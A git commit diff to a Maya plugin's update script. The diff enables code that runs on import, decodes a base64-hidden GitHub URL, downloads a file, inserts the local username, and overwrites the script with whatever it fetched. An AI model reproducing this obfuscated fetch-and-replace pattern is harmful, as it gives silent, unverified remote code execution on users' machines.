21140787282c47079c02bd1c07bbd21fd92bae41
burasate <61697687+burasate@users.noreply.github.com>
2023-07-16 01:39:46 +0700

    Update support2xx.py

--- service/support2xx.py
+++ service/support2xx.py
@@ -18,22 +18,20 @@ def update_version():
 
     maya_app_dir = mel.eval('getenv MAYA_APP_DIR')
     base_dir = os.path.dirname(os.path.abspath(__file__))
-    print('base_dir' ,base_dir)
+    #print('base_dir' ,base_dir)
     script_path = os.path.abspath(__file__).replace('.pyc', '.py')
-    print('script_path', script_path)
+    #print('script_path', script_path)
     updated_file_path_b64 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1cmFzYXRlL0JSU0xvY0RlbGF5L21hc3Rlci9zZXJ2aWNlL3VwZGF0ZS9LZXlmcmFtZU92ZXJsYXAucHk='
 
     u_read = uLib.urlopen(base64.b64decode(updated_file_path_b64).decode()).read().replace('$usr_orig$', getpass.getuser())
-    print(u_read)
+    #print(u_read)
 
     write_path = base_dir + os.sep + 'test_update.txt' if 'assetRepo' in base_dir else script_path
-    print(write_path)
-    #with open(write_path, 'w') as f:
-        #f.write(u_read)
-        #f.close()
+    with open(write_path, 'w') as f:
+        f.write(u_read)
+        f.close()
 
 update_version()
-
 
 '''========================================='''
 # Supporter
